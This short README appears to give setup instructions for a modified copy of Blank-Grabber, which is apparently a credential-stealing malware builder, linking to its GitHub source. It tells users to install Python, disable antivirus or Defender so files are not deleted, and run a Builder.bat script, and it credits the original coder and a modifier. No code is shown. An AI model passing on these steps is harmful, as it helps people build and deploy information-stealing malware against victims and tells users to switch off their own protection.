Python 3.11 must be installed!
Internet connection must be available!
Disable your antivirus/defender as it might delete some important files!

Run "Builder.bat" and all the required modules will install. (python modules)

ALL CREDITS GOES TO BLANK FOR CODING EVERYTHING ALL SEVENV1 DID WAS UPDATE SOME THINGS TO MAKE THEM BETTER AND IMPROVED!
(https://github.com/Blank-c/Blank-Grabber)